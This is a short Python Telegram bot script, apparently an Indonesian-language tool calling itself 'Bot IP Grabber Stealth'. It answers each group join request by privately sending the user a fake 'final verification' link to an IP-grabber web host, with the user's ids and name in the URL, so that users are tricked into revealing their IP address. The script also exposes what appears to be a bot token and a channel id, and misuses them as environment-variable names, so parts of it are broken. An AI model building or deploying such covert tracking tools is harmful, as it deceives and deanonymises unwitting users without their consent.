import telebot
from telebot import types
import os
from dotenv import load_dotenv

load_dotenv()

bot = telebot.TeleBot(os.getenv('8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg'))
WEB_URL = os.getenv('https://ip-grabber-bot-production.up.railway.app')
LOG_CHANNEL = os.getenv('-1002290475903')

@bot.chat_join_request_handler()
def handle_join_request(request: types.ChatJoinRequest):
    user_id = request.user_chat_id
    chat_id = request.chat.id
    first_name = request.from_user.first_name or "User"

    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔐 Verifikasi Akun & Masuk Grup", url=link))

    try:
        bot.send_message(
            user_id,
            f"✅ Verifikasi human berhasil!\n\n"
            f"Klik tombol di bawah ini untuk **verifikasi akhir** dan masuk grup:\n\n"
            f"Link akan expired dalam 10 menit.",
            reply_markup=markup
        )
    except Exception as e:
        print(f"❌ Gagal kirim PM: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "✅ Bot IP Grabber Stealth aktif!")

print("🤖 Bot IP Grabber Stealth sedang jalan...")
bot.infinity_polling()
